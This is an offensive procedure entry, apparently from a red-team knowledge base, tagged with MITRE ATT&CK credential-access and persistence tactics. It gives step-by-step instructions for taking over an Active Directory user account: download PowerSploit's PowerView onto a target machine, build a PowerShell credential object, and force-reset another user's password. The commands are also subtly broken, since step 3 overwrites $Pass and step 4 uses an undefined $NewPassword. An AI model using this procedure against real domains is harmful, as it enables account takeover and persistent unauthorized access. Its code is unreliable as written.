---
id: 06147f80-0aeb-4aef-94bc-a4d707a6f976
name: Change an AD Domain User's Password
type: procedure
verified: false
submitted: false
created_at: '2020-06-25T22:16:45.338590+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Account Manipulation|T1098 - Account Manipulation]]'
platforms:
- Windows
tags:
- '[[Active Directory]]'
- '[[powershell]]'
commands:
- '[[Create a Windows PSCredential Object]]'
- '[[Create a Windows Secure String]]'
- '[[PowerView Reset a Domain User''s Password]]'
---

# Change an AD Domain User's Password

## Summary

Change the password of an Active Directory user. This requires an account with sufficient authorization to modify other users' passwords (often via group membership or ACLs). 

## Description

# Description

Change the password of an Active Directory user. This requires an account with sufficient authorization to modify other users' passwords (often via group membership or ACLs).



# Instructions

1. Download PowerView (dev branch), and import it on the target machine: [Download from GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

2. Create a PowerShell Credential object with an authorized user's credentials





**Command** ([[Create a Windows PSCredential Object]]):

```bash
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
```





3. Create a Secure String object with the new password.





**Command** ([[Create a Windows Secure String]]):

```bash
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
```





4. Use PowerView to reset the target user's password.





**Command** ([[PowerView Reset a Domain User's Password]]):

```bash
Set-DomainUserPassword -Identity $_TARGET_USER -AccountPassword $NewPassword -Credential $Cred
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Account Manipulation|T1098 - Account Manipulation]]

## Commands Used

- [[Create a Windows PSCredential Object]]
- [[Create a Windows Secure String]]
- [[PowerView Reset a Domain User's Password]]

## Tags

- [[Active Directory]]
- [[powershell]]


